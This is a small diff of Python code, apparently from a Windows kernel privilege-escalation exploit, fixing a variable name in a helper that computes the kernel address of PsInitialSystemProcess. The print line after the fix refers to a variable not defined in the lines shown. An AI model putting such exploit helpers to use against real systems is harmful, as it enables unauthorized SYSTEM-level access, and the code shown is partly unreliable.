@@ -149,7 +149,7 @@ def get_PsISP_kernel_address(kernel_base):
     print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
     
     # Calculate PsInitialSystemProcess offset in kernel land
-    system_process_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
+    system_process_base_pointer = kernel_base + ( PsISP_user_address - hKernelImage)
     print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
     
     PsISP_kernel_address = c_ulonglong()
